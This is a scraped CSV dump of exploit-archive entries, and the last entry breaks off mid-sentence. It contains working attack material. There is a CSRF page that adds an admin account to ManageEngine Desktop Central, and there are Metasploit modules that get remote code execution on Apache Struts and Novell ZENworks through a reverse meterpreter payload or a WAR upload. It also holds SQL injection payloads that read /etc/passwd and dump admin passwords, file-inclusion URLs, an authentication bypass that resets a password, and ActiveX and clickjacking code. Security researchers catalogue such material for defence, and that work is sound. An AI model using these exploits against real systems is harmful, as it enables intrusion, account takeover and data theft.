35980,"ManageEngine Desktop Central 9 Build 90087 - Cross-Site Request Forgery <html> <!-- # Exploit Title: ManageEngine Desktop Central 9 Add and admin user through Cross-Site Request Forgery (CSRF) # Date: 05 December 2014 # Exploit Author: Mohamed Idris – Help AG Middle East # Vendor Homepage: http://www.manageengine.com/ # Software Link: http://www.manageengine.com/products/desktop-central/ # Version: All versions below build 90121 # Tested on: Version 9 Build 90087 # CVEID: CVE-2014-9331 # Vulnerability Fix: http://www.manageengine.com/products/desktop-central/cve20149331-cross-site-request-forgery.html  POC Code: When an authenticated application admin clicks a link to the below code, you well get a user “Hacker” with the password “HackerPass” added to the application (convincing the admin to click on a link is so easy ;)). Remember to change the IP to the target server IP address in the code. -->   <!-- CSRF PoC - Add an admin account -->   <body>     <form action=""http://<Server-IP>:8020/STATE_ID/1417736606982/roleMgmt.do?actionToCall=addUser&SUBREQUEST=XMLHTTP"" method=""POST"">       <input type=""hidden"" name=""AuthenticationType"" value=""DC"" />       <input type=""hidden"" name=""newDCAuthUserName"" value=""Hacker"" />       <input type=""hidden"" name=""newDCAuthUserPassword"" value=""HackerPass"" />       <input type=""hidden"" name=""DCAuthconfirmPassword"" value=""HackerPass"" />       <input type=""hidden"" name=""newDCAuthUserEmail"" value="""" />       <input type=""hidden"" name=""newDCAuthUserPNumber"" value="""" />       <input type=""hidden"" name=""newADAuthUserEmail"" value="""" />       <input type=""hidden"" name=""newADAuthUserPNumber"" value="""" />       <input type=""hidden"" name=""MapType"" value=""ALL"" />       <input type=""hidden"" name=""aduserSearch"" value="""" />       <input type=""hidden"" name=""searchValue"" value=""Search"" />       <input type=""hidden"" name=""aduserSearchRO"" value="""" />       <input type=""hidden"" name=""searchValue"" value=""Search"" />       <input type=""hidden"" name=""action1"" value=""DC_ADD_USER"" />       <input type=""hidden"" name=""addUser"" value=""Add User"" />       <input type=""hidden"" name=""cancle"" value=""Cancel"" />       <input type=""hidden"" name=""customerids"" value="""" />       <input type=""hidden"" name=""roleListDCAuth"" value=""1"" />       <input type=""hidden"" name=""PERSONALISE_LANGUAGE"" value=""en_US"" />       <input type=""hidden"" name=""domainListADAuth"" value=""-1"" />       <input type=""hidden"" name=""roleListADAuth"" value=""-1"" />       <input type=""hidden"" name=""PERSONALISE_LANGUAGE"" value=""en_US"" />       <input type=""submit"" value=""Submit request"" />     </form>   </body> </html>",zohocorp,1
39756,"Apache Struts - Dynamic Method Invocation Remote Code Execution (Metasploit) ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core'  class MetasploitModule < Msf::Exploit::Remote   Rank = ExcellentRanking    include Msf::Exploit::Remote::HttpClient   include Msf::Exploit::EXE    def initialize(info = {})     super(update_info(info,       'Name'           => 'Apache Struts Dynamic Method Invocation Remote Code Execution',       'Description'    => %q{         This module exploits a remote command execution vulnerability in Apache Struts         version between 2.3.20 and 2.3.28 (except 2.3.20.2 and 2.3.24.2). Remote Code         Execution can be performed via method: prefix when Dynamic Method Invocation         is enabled.       },       'Author'         => [ 'Nixawk' ],       'License'        => MSF_LICENSE,       'References'     =>         [           [ 'CVE', '2016-3081' ],           [ 'URL', 'https://www.seebug.org/vuldb/ssvid-91389' ]         ],       'Platform'       => %w{ linux },       'Privileged'     => true,       'DefaultOptions' => {         'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp_uuid'       },       'Targets'        =>         [           ['Linux Universal',             {               'Arch' => ARCH_X86,               'Platform' => 'linux'             }           ]         ],       'DisclosureDate' => 'Apr 27 2016',       'DefaultTarget' => 0))      register_options(       [         Opt::RPORT(8080),         OptString.new('TARGETURI', [ true, 'The path to a struts application action', '/blank-struts2/login.action']),         OptString.new('TMPPATH', [ false, 'Overwrite the temp path for the file upload. Needed if the home directory is not writable.', nil])       ], self.class)   end    def print_status(msg='')     super(""#{peer} - #{msg}"")   end    def send_http_request(payload)     uri = normalize_uri(datastore['TARGETURI'])     res = send_request_cgi(       'uri'     => ""#{uri}#{payload}"",       'method'  => 'POST')     if res && res.code == 404       fail_with(Failure::BadConfig, 'Server returned HTTP 404, please double check TARGETURI')     end     res   end    def parameterize(params) # params is a hash     URI.escape(params.collect { |k, v| ""#{k}=#{v}"" }.join('&'))   end    def generate_rce_payload(code, params_hash)     payload = ""?method:""     payload << Rex::Text.uri_encode(""#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS"")     payload << "",""     payload << Rex::Text.uri_encode(code)     payload << "",""     payload << Rex::Text.uri_encode(""1?#xx:#request.toString"")     payload << ""&""     payload << parameterize(params_hash)     payload   end    def temp_path     @TMPPATH ||= lambda {       path = datastore['TMPPATH']       return nil unless path       unless path.end_with?('/')         path << '/'       end       return path     }.call   end    def upload_file(filename, content)     var_a = rand_text_alpha_lower(4)     var_b = rand_text_alpha_lower(4)     var_c = rand_text_alpha_lower(4)     var_d = rand_text_alpha_lower(4)      code = ""##{var_a}=new sun.misc.BASE64Decoder(),""     code << ""##{var_b}=new java.io.FileOutputStream(new java.lang.String(##{var_a}.decodeBuffer(#parameters.#{var_c}[0]))),""     code << ""##{var_b}.write(##{var_a}.decodeBuffer(#parameters.#{var_d}[0])),""     code << ""##{var_b}.close()""      params_hash = { var_c => filename, var_d => content }     payload = generate_rce_payload(code, params_hash)      send_http_request(payload)   end    def execute_command(cmd)     var_a = rand_text_alpha_lower(4)     var_b = rand_text_alpha_lower(4)     var_c = rand_text_alpha_lower(4)     var_d = rand_text_alpha_lower(4)     var_e = rand_text_alpha_lower(4)     var_f = rand_text_alpha_lower(4)      code = ""##{var_a}=@java.lang.Runtime@getRuntime().exec(#parameters.#{var_f}[0]).getInputStream(),""     code << ""##{var_b}=new java.io.InputStreamReader(##{var_a}),""     code << ""##{var_c}=new java.io.BufferedReader(##{var_b}),""     code << ""##{var_d}=new char[1024],""     code << ""##{var_c}.read(##{var_d}),""      code << ""##{var_e}=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),""     code << ""##{var_e}.println(##{var_d}),""     code << ""##{var_e}.close()""      cmd.tr!(' ', '+') if cmd && cmd.include?(' ')     params_hash = { var_f => cmd }     payload = generate_rce_payload(code, params_hash)      send_http_request(payload)   end    def linux_stager     payload_exe = rand_text_alphanumeric(4 + rand(4))     path = temp_path || '/tmp/'     payload_exe = ""#{path}#{payload_exe}""      b64_filename = Rex::Text.encode_base64(payload_exe)     b64_content = Rex::Text.encode_base64(generate_payload_exe)      print_status(""Uploading exploit to #{payload_exe}"")     upload_file(b64_filename, b64_content)      print_status(""Attempting to execute the payload..."")     execute_command(""chmod 700 #{payload_exe}"")     execute_command(""/bin/sh -c #{payload_exe}"")   end    def exploit     linux_stager   end    def check     var_a = rand_text_alpha_lower(4)     var_b = rand_text_alpha_lower(4)      addend_one = rand_text_numeric(rand(3) + 1).to_i     addend_two = rand_text_numeric(rand(3) + 1).to_i     sum = addend_one + addend_two     flag = Rex::Text.rand_text_alpha(5)      code = ""##{var_a}=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),""     code << ""##{var_a}.print(#parameters.#{var_b}[0]),""     code << ""##{var_a}.print(new java.lang.Integer(#{addend_one}+#{addend_two})),""     code << ""##{var_a}.print(#parameters.#{var_b}[0]),""     code << ""##{var_a}.close()""      params_hash = { var_b => flag }     payload = generate_rce_payload(code, params_hash)      begin       resp = send_http_request(payload)     rescue Msf::Exploit::Failed       return Exploit::CheckCode::Unknown     end      if resp && resp.code == 200 && resp.body.include?(""#{flag}#{sum}#{flag}"")       Exploit::CheckCode::Vulnerable     else       Exploit::CheckCode::Safe     end   end  end",.seebug.,0
29517,"Project'Or RIA 3.4.0 - 'objectDetail.php?objectId' SQL Injection ============================================= INTERNET SECURITY AUDITORS ALERT 2013-017 - Original release date: July 26th, 2013 - Last revised:  July 26th, 2013 - Discovered by: Vicente Aguilera Diaz - Severity: 6.8/10 (CVSSv2 Base Scored) - CVE-ID: CVE-2013-6164 =============================================  I. VULNERABILITY ------------------------- SQL Injection vulnerability in ""Project'Or RIA"" allow arbitrary access to the database and the file system.   II. BACKGROUND ------------------------- Project'Or RIA is an open source Project Management Software, trying to gather in a single tool every functionality needed to organize your projects. The objective is to keep it simple, easy to use on a day to day activity, while covering most of the project management functionalities.   III. DESCRIPTION ------------------------- Has been detected a SQL Injection vulnerability in the ""Affectations"" functionality of this application. The affected resource and parameter are the  following:  Resource:     /view/objectDetail.php  Parameter:     objectId  This vulnerability allows the execution of arbitrary SQL code against the database, and arbitrary access to the file system.   IV. PROOF OF CONCEPT ------------------------- When a user access to the ""Environmental parameters / Affectations"" functionality, is generated a output with a list of resources. If a user access to the de  tails of a resource, is generated a request as follows:      POST /view/objectDetail.php?destinationWidth=1017 HTTP/1.1     Host: <projectorria-server>      objectClass=Affectation&objectId=000042&listIdFilter=&listFilterClause=  where the ""objectId"" value contains the resource identifier.  A malicious user can inject arbitrary SQL code in the <objecId> parameters of this request. For example:  1. Accessing the file system 1.1 /etc/passwd Modified parameter:      <objectId>  Value:      99942+union+(select+load_file('/etc/passwd'),null,null,null,null,null,null,null,null,null,null,null+from+dual)  Request:  POST /view/objectDetail.php?destinationWidth=1017 HTTP/1.1 Host: <projectorria-server>  objectClass=Affectation&objectId=99942+union+(select+load_file('/etc/passwd'),null,null,null,null,null,null,null,null,null,null,null+from+dual)  &listIdFilter=&listFilterClause=  Response: HTTP/1.1 200 OK  ... <span dojoType=""dijit.form.TextBox"" type=""text""   id=""id"" name=""id""  class=""display""  readonly tabindex=""-1"" style=""width: 75px;""   value=""root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh syslog:x:101:103::/home/syslog:/bin/false whoopsie:x:102:104::/nonexistent:/bin/false landscape:x:103:105::/var/lib/landscape:/bin/false messagebus:x:104:108::/var/run/dbus:/bin/false ntpd:x:105:111::/var/run/openntpd:/bin/false postfix:x:106:113::/var/spool/postfix:/bin/false babynus:x:1000:1000::/home/babynus:/bin/bash bind:x:107:115::/var/cache/bind:/bin/false sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin zend:x:109:116::/usr/local/zend/gui/lighttpd/:/bin/false mysql:x:110:117:MySQL Server,,,:/nonexistent:/bin/false nagios:x:111:118::/var/lib/nagios:/bin/false smmta:x:112:119:Mail Transfer Agent,,,:/var/lib/sendmail:/bin/false smmsp:x:113:120:Mail Submission Program,,,:/var/lib/sendmail:/bin/false postgres:x:114:121:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash "" ></span> ...  Obtained info (/etc/passw): root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh syslog:x:101:103::/home/syslog:/bin/false whoopsie:x:102:104::/nonexistent:/bin/false landscape:x:103:105::/var/lib/landscape:/bin/false messagebus:x:104:108::/var/run/dbus:/bin/false ntpd:x:105:111::/var/run/openntpd:/bin/false postfix:x:106:113::/var/spool/postfix:/bin/false babynus:x:1000:1000::/home/babynus:/bin/bash bind:x:107:115::/var/cache/bind:/bin/false sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin zend:x:109:116::/usr/local/zend/gui/lighttpd/:/bin/false mysql:x:110:117:MySQL Server,,,:/nonexistent:/bin/false nagios:x:111:118::/var/lib/nagios:/bin/false smmta:x:112:119:Mail Transfer Agent,,,:/var/lib/sendmail:/bin/false smmsp:x:113:120:Mail Submission Program,,,:/var/lib/sendmail:/bin/false postgres:x:114:121:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash   2. Obtaining database private information 2.1 Obtaining TABLE_NAME from INFORMATION_sCHEMA.TABLES Modified parameter:      <objectId>  Value:      99942+union+(select+@@version,null,null,null,null,null,null,null,null,null,null,null+from+dual)  Request:  POST /view/objectDetail.php?destinationWidth=1017 HTTP/1.1 Host: <projectorria-server>  objectClass=Affectation&objectId=99942+union+(select+@@version,null,null,null,null,null,null,null,null,null,null,null+from+dual)  &listIdFilter=&listFilterClause=  Response: HTTP/1.1 200 OK  <span dojoType=""dijit.form.TextBox"" type=""text""   id=""id"" name=""id""  class=""display""  readonly tabindex=""-1"" style=""width: 75px;""  value=""5.5.24-  0ubuntu0.12.04.1"" >  Obtained info (MySQL Version): 5.5.24-0ubuntu0.12.04.1   V. BUSINESS IMPACT ------------------------- An attacker can execute arbitrary SQL code and gain access to private information stored in the database or the file system.    VI. SYSTEMS AFFECTED ------------------------- Tested in Project'Or RIA v3.4.0    VII. SOLUTION ------------------------- Pending.   VIII. REFERENCES ------------------------- http://projectorria.org http://www.isecauditors.com   IX. CREDITS ------------------------- This vulnerability has been discovered by Vicente Aguilera Diaz (vaguilera (at) isecauditors (dot) com).   X. REVISION HISTORY ------------------------- July    26, 2013: Initial release   XI. DISCLOSURE TIMELINE ------------------------- July      25, 2013: Vulnerability acquired by Internet Security Auditors (www.isecauditors.com). September 26, 2013: Sent to project support. November  03, 2013: New release and disclosure.    XII. LEGAL NOTICES ------------------------- The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise. Internet Security  Auditors accepts no responsibility for any damage caused by the use or misuse of this information.   XIII. ABOUT ------------------------- Internet Security Auditors is a Spain based leader in web application testing, network security, penetration testing, security compliance implementation and  assessing. Our clients include some of the largest companies in areas such as finance, telecommunications, insurance, ITC, etc. We are vendor independent  provider with a deep expertise since 2001. Our efforts in R&D include vulnerability research, open security project collaboration and whitepapers,  presentations and security events participation and promotion. For further information regarding our security services, contact us.   XIV. FOLLOW US ------------------------- You can follow Internet Security Auditors, news and security advisories at: https://www.facebook.com/ISecAuditors https://twitter.com/ISecAuditors http://www.linkedin.com/company/internet-security-auditors http://www.youtube.com/user/ISecAuditors",Project,0
1825,"Back-End CMS 0.7.2.2 - 'BE_config.php' Remote File Inclusion ################# DEVIL TEAM THE BEST POLISH TEAM ################## # #   Back-End CMS - Remote File Include Vulnerabilities #   Find by Kacper (Rahim). #   Greetings For ALL DEVIL TEAM members, Special DragonHeart :*** #   Contact: kacper1964@yahoo.pl   or   http://www.devilteam.yum.pl #   Site of script: http://www.back-end.org # #################################################################### */  BE_config.php Line 27-31:  [code] ...   // Script timer   require_once($_PSL['classdir'] . '/BE_phpTimer.class');   $scriptTimer = & pslSingleton('phpTimer');   $scriptTimer->start('main');   /* Use Example ... [/code]   /*  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  http://www.site.com/[Back-End_path]/BE_config.php?_PSL[classdir]=[evil_scripts]  #Elo ;-)  # milw0rm.com [2006-05-25]",.devilteam.yum.pl,1
1864,"ashNews 0.83 - 'pathtoashnews' Remote File Inclusion ################ DEVIL TEAM THE BEST POLISH TEAM ################# # # ashnews v0.83(pathtoashnews) - Remote File Include Vulnerabilities # Script site: http://dev.ashwebstudio.com/ # dork: News powered by ashnews # Find by Kacper (Rahim). # Greetings; DragonHeart, Satan, Leito, Leon, Luzak, Adam, DeathSpeed, Drzewko, pepi # ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ # Special greetz DragonHeart :*** # ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ # Contact: kacper1964@yahoo.pl   or   http://www.devilteam.yum.pl # ################################################################## Expl:  http://www.site.com/[ashnews_path]/ashheadlines.php?pathtoashnews=[evil_scripts]  http://www.site.com/[ashnews_path]/ashnews.php?pathtoashnews=[evil_scripts]   #Elo ;-)  # milw0rm.com [2006-06-02]",ashNews,0
2709,"Creasito E-Commerce Content Manager - 'admin' Authentication Bypass                                               ============================================================================================  Creasito E-Commerce Content Manager (admin) Authentication Bypass  ============================================================================================  Product............: Creasito E-Commerce Content Manager Affected versions..: Creasito <= 1.3.08 Security Risk......: High Vendor.............: G. Fabozzi (http://creasito.bloghosteria.com/) Product Link.......: http://prdownloads.sourceforge.net/creasito/creasito1.3.08.zip?download Discovered by......: SlimTim10   Details: --------- Files in the /admin directory use a very poor security method for authentication that is simple to bypass.  Vulnerable Code: ----------------- if ( empty( $finame ) ) { ?> Prego effettuare il login <a href=""index.php""> Qui<br> &copy;Bloghosteria.com<br> </a>  Vulnerable Files: ------------------ (in /admin) addnewcont.php, adminpassw.php, amministrazione.php, artins.php, bgcolor.php, cancartcat.php, canccat.php, cancelart.php, cancontsit.php, chanpassamm.php, dele.php, delecat.php, delecont.php, emailall.php, gestflashtempl.php, gestmagart.php, gestmagaz.php, gestpre.php, input.php, input3.php, insnucat.php, instempflash.php, mailfc.php, modfdati.php, rescont4.php, ricordo1.php, ricordo4.php, tabcatalg.php, tabcont.php, tabcont3.php, tabstile.php, tabstile3.php, testimmg.php, update.php  Proof of Concept: ------------------  http://[host]/admin/amministrazione.php?finame=1 http://[host]/admin/admin/dele.php?finame=1 http://[host]/admin/chanpassamm.php?finame=1&password=testing&passver=testing * * Changes the password as well as bypassing authentication   Solution: ---------- Use a better authentication method, like cookies!  ================================================================  Shoutz: PCD, dw0rek, Tainted, str0ke! SlimTim10 <slimtim10[at]gmail[dot]com>  ================================================================  # milw0rm.com [2006-11-03]",Creasito,1
7910,"WOW Web On Windows ActiveX Control 2 - Remote Code Execution Written By Michael Brooks Special thanks to str0ke!  software:WOW - Web On Windows ActiveX Control 2  - Remote Code Execution exploit type: Remote File Upload and Remote Code Execution Download: http://www.download.com/WOW-Web-On-Windows-ActiveX-Control/3000-2206_4-10049976.html 183,682  downloads at the time of publishing this exploit.  This entire dll is full of bad functions,  including read write access to the registry. This must have been accidentally registered to IE's ActiveX interface.  <html> <object classid=""clsid:441E9D47-9F52-11D6-9672-0080C88B3613"" id=""obj""> 	</object> </html> 	<script> 	obj.WriteIniFileString(""C:\\hack.bat"","""",""calc.exe "",""""); 	obj.ShellExecute(0,""open"",""hack.bat"",0,""C:\\"",0); </script>  # milw0rm.com [2009-01-29]",.download.,0
3227,"CascadianFAQ 4.1 - 'index.php' SQL Injection ******************************************************************************* # Title   :  CascadianFAQ <= 4.1 (index.php) Remote Blind SQL Injection Vulnerability # Author  :  ajann # Contact :  :( # S.Page  :  http://eclectic-designs.com # $$      :  Free # Dork    :  This FAQ is powered by CascadianFAQ # DorkEx  :  http://www.google.com.tr/search?hl=tr&q=This+FAQ+is+powered+by+CascadianFAQ+&btnG=Google%27da+Ara&meta=  *******************************************************************************  [[SQL]]]---------------------------------------------------------  http://[target]/[path]//index.php?catid=[SQL]  Example:  //index.php?catid=-1%20union%20select%20concat(char(85),char(115),char(101),char(114),char(110),char(97),char(109),char(101),char(58),username,char(32),char(124),char(124),char(32),char(80),char(97),char(115),char(115),char(119),char(111),char(114),char(100),char(58),password),2%20from%20cfaq_admin%20where%20accesslevel%20like%201/*  [[/SQL]]  """""""""""""""""""""""""""""""""""""""""" # ajann,Turkey # ...  # Im not Hacker!  # milw0rm.com [2007-01-30]",CascadianFAQ,0
11587,"ProMan 0.1.1 - Multiple File Inclusions ############################################################## ##ProMan  <= 0.1.1 Multiple File Include Vulnerability ############################################################## Author: cr4wl3r <cr4wl3r\x40linuxmail\x2Eorg> Download: http://sourceforge.net/projects/pman/files/ ############################################################## [RFI Code]  <?php                     if (!($_GET['page']))                     	include('info.php');                     else                             include $_GET['page'].'.php';                  ?>  [LFI Code]  include_once('lang/'.$_SESSION['userLang'].'/elisttasks.php'); if (!defined('PROMAN'))  	pexit ($l['no hack']);  ############################################################## PoC RFI:  [phpRAINCHECK_path]/_center.php?page=[Shell] ############################################################## PoC LFI:  [phpRAINCHECK_path]/elisttasks.php?_SESSION[userLang]=[LFI%00]  [phpRAINCHECK_path]/managepmanagers.php?_SESSION[userLang]=[LFI%00]  [phpRAINCHECK_path]/manageusers.php?_SESSION[userLang]=[LFI%00]  [phpRAINCHECK_path]/helpfunc.php?_SESSION[userLang]=[LFI%00]  [phpRAINCHECK_path]/managegroups.php?_SESSION[userLang]=[LFI%00]  [phpRAINCHECK_path]/manageprocess.php?_SESSION[userLang]=[LFI%00]  [phpRAINCHECK_path]/manageusersgroups.php?_SESSION[userLang]=[LFI%00]  others... ##############################################################",ProMan,0
7842,"Mozilla Firefox 3.0.5 - Status Bar Obfuscation / Clickjacking Firefox 3.0.5 Status Bar Obfuscation / Clickjacking ===========================================  <html> <body> <div id=""mydiv"" onmouseover=""document.location='http://www.milw0rm.com';"" style=""position:absolute;width:2px;height:2px;background:#FFFFFF;border:0px""></div> <script> function updatebox(evt) { mouseX=evt.pageX?evt.pageX:evt.clientX; mouseY=evt.pageY?evt.pageY:evt.clientY; document.getElementById('mydiv').style.left=mouseX-1; document.getElementById('mydiv').style.top=mouseY-1; } </script> <center> <br> <font style=""font-family:arial;font-size:32px"">Status Bar Obfuscation / Clickjacking</font><br> <font style=""font-family:arial;font-size:24px"">By MrDoug</font><br> <br> <hr size=""3"" width=""500"" color=""#000000""> <br> <font style=""font-family:arial;font-size:20px"">Click the VALID link to google below to visit milw0rm.com</font><br> <br> <a href=""http://www.google.com"" onclick=""updatebox(event)""><font style=""font-family:arial;font-size:32px"">http://www.google.com</font></a><br> <br> <hr size=""3"" width=""500"" color=""#000000""> <br> <font style=""font-family:arial;font-size:16px"">Greetz to Slappywag</font><br> </center> <div style=""position:absolute;bottom:0;""> <font style=""font-family:arial;font-size:32px"">Note this...<br> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;<br> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;V </font> </div> </body> </html>  =========================================== MrDoug mrdoug13[at]gmail[dot]com  # milw0rm.com [2009-01-21]",.milw0rm.,0
3542,ClassWeb 2.0.3 - 'BASE' Remote File Inclusion # ClassWeb <= 2.03 Remote File Include Vulnerabilities # D.Script: http://sourceforge.net/projects/classweb/ # Discovered by: GolD_M = [Mahmood_ali] # Homepage: http://www.Tryag.cc # Greetz To: Tryag-Team & 4lKaSrGoLd3n-Team & AsbMay's Group # Exploit:  # [path]/classweb/language.php?BASE=Shell # [Path]/classweb/phpadmin/survey.php?BASE=Shell  # milw0rm.com [2007-03-22],ClassWeb,1
9095,"TalkBack 2.3.14 - Multiple Vulnerabilities JIKO No-exploit.Com Download:http://scripts.oldguy.us/talkback/downloads2/talkback2.3.14.zip Script : talkback V 2.3.14 Dork:inurl:test.php Powered by TalkBack -------------------------------------------- Edit Comment ~[+] talkback/comments.php?edit=1&edit_id=2& Command ~[+] talkback/addons/import.php?result=[Command]         Code;         $last_line = system($command, $result); Local File ~[+]         Note : if floder install not deleted http://localhost/test/talkback/install/help.php?language=[File]     code;         $file = ""../language/{$_REQUEST['language']}.php"";     if (!is_file($file))         exit(""Language file '$file' does not exist"");     include ($file);  # milw0rm.com [2009-07-09]",TalkBack,1
24938,"Novell ZENworks Configuration Management 10 SP3/11 SP2 - Remote Execution (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # web site for more information on licensing and terms of use. #   http://metasploit.com/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote   Rank = GreatRanking    HttpFingerprint = { :pattern => [ /Apache-Coyote/ ] }    include Msf::Exploit::Remote::HttpClient   include Msf::Exploit::EXE    def initialize(info = {})     super(update_info(info,       'Name'        => 'Novell ZENworks Configuration Management Remote Execution',       'Description' => %q{           This module exploits a code execution flaw in Novell ZENworks Configuration         Management 10 SP3 and 11 SP2. The vulnerability exists in the ZEnworks Control         Center application, allowing an unauthenticated attacker to upload a malicious file         outside of the TEMP directory and then make a second request that allows for         arbitrary code execution. This module has been tested successfully on Novell         ZENworks Configuration Management 10 SP3 and 11 SP2 on Windows 2003 SP2 and SUSE         Linux Enterprise Server 10 SP3.       },       'Author'      =>         [           'James Burton', # Vulnerability discovery           'juan vazquez' # Metasploit module         ],       'License'     => MSF_LICENSE,       'References'  =>         [           [ 'CVE', '2013-1080' ],           [ 'BID', '58668' ],           [ 'OSVDB', '91627' ],           [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-13-049/' ],           [ 'URL', 'http://www.novell.com/support/kb/doc.php?id=7011812' ]         ],       'Privileged'  => false,       'Platform'    => [ 'win', 'linux' ],       'Targets'     =>         [           [ 'ZENworks Configuration Management 10 SP3 and 11 SP2 / Windows 2003 SP2',             {               'Arch' => ARCH_X86,               'Platform' => 'win',               'Traversal' => '../webapps/'             }           ],           [ 'ZENworks Configuration Management 10 SP3 and 11 SP2 / SUSE Linux Enterprise Server 10 SP3',             {               'Arch' => ARCH_X86,               'Platform' => 'linux',               'Traversal' => '../../opt/novell/zenworks/share/tomcat/webapps/'             }           ]         ],       'DefaultTarget'  => 1,       'DisclosureDate' => 'Mar 22 2013'))      register_options(       [         Opt::RPORT(443),         OptBool.new('SSL', [true, 'Use SSL', true])       ], self.class)   end    def check     res = send_request_cgi({       'method' => 'GET',       'uri'    => ""/zenworks/jsp/fw/internal/Login.jsp""     })      if res and res.code == 200 and res.body =~ /Novell ZENworks Control Center/       return Exploit::CheckCode::Detected     end      return Exploit::CheckCode::Detected   end    def exploit      # Generate the WAR containing the EXE containing the payload     app_base = rand_text_alphanumeric(4+rand(4))     jsp_name = rand_text_alphanumeric(8+rand(8))      war_data = payload.encoded_war(:app_name => app_base, :jsp_name => jsp_name).to_s      print_status(""Uploading #{war_data.length} bytes as #{app_base}.war ..."")      # Rex::MIME::Message.new doesn't work fine with binary data, destroys ""\x0d"" chars     boundary = ""----#{rand_text_alpha(34)}""     data = ""--#{boundary}\r\n""     data << ""Content-Disposition: form-data; name=\""mainPage:_ctrl21a:FindFile:filePathTextBox\""; filename=\""#{target['Traversal']}#{app_base}.war\""\r\n""     data << ""Content-Type: application/octet-stream\r\n\r\n""     data << war_data     data << ""\r\n""     data << ""--#{boundary}--""      res = send_request_cgi(       {         'method' => 'POST',         'uri'    => ""/zenworks/jsp/index.jsp?pageid=newDocumentWizard"",         'ctype'  => ""multipart/form-data; boundary=#{boundary}"",         'data'   => data       })      if res and res.code == 302       print_status(""Upload finished, waiting 20 seconds for payload deployment..."")     else       fail_with(Exploit::Failure::Unknown, ""Failed to upload payload"")     end      # Wait to ensure the uploaded war is deployed     select(nil, nil, nil, 20)      print_status(""Triggering payload at '/#{app_base}/#{jsp_name}.jsp' ..."")     send_request_cgi({       'uri'    => normalize_uri(app_base, ""#{jsp_name}.jsp""),       'method' => 'GET',     })   end  end",.zerodayinitiative.,0
27430,"PHPFox 3.6.0 (build3) - Multiple SQL Injections ------------------------------------------------------------ PHPFox v3.6.0 (build3) Multiple SQL Injection vulnerabilities ------------------------------------------------------------  == Description == - Software link: http://www.phpfox.com - Affected versions: version 3.6.0 (build3) is vulnerable. Other versions might be affected as well. - Vulnerability discovered by: Matias Fontanini  == Vulnerabilities == When performing POST requests to /user/browse/view_/, the ""search[gender]"" and ""search[sort_by]"" parameters are not correctly sanitized before being used to construct SQL queries, making them vulnerable to Blind SQL Injection attacks.  == Proof of concept ==  - For the ""search[gender]"" parameter, using the condition ""1=0"" so that no results are returned:  POST /user/browse/view_/ core[security_token]=0db230b2a8b6755b8cfe60d97fb1a613&search[gender]=2 and 1=0search[from]=&search[to]=&search[country]=&null=1&search[city]=&search[zip]=&search[keyword]=&search[type]=0&search[submit]=Submit&custom[1]=&custom[2]=&custom[3]=&custom[4]=&custom[5]=&custom[6]=&custom[7]=&search[sort]=u.last_login&search[sort_by]=DESC  - The ""search[sort_by]"" parameter is inserted in a ""order by"" clause. Therefore, an attacker could exploit it by making the application sort the results based on a different criteria, depending on whether the query was successful:  POST /user/browse/view_/ core[security_token]=0db230b2a8b6755b8cfe60d97fb1a613&search[gender]=2&search[from]=&search[to]=&search[country]=&null=1&search[city]=&search[zip]=&search[keyword]=&search[type]=0&search[submit]=Submit&custom[1]=&custom[2]=&custom[3]=&custom[4]=&custom[5]=&custom[6]=&custom[7]=&search[sort]=u.last_login&search[sort_by]=ASC,(case when (select 1 from dual) then birthday_search else password end)  == Solution == Upgrade the product to the 